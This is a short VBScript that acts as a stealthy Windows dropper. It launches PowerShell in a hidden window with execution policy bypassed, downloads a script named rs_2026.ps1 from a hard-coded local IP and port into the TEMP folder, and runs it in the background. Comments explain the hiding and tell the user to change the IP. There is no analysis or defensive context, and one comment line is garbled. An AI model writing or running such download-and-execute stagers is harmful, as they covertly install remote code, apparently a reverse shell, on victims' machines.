Set objShell = CreateObject("Wscript.Shell")

' The "0" at the end tells Windows to completely hide the window (no taskbar icon).
' The "False" tells the script not to wait for PowerShell to finish, letting it run in the background.
' change the ip in the below line PowerShell to finish.
objShell.Run "powershell -ExecutionPolicy Bypass -Command ""iwr http://192.168.1.19:9000/rs_2026.ps1 -OutFile $env:TEMP\rs.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\rs.ps1""", 0, False
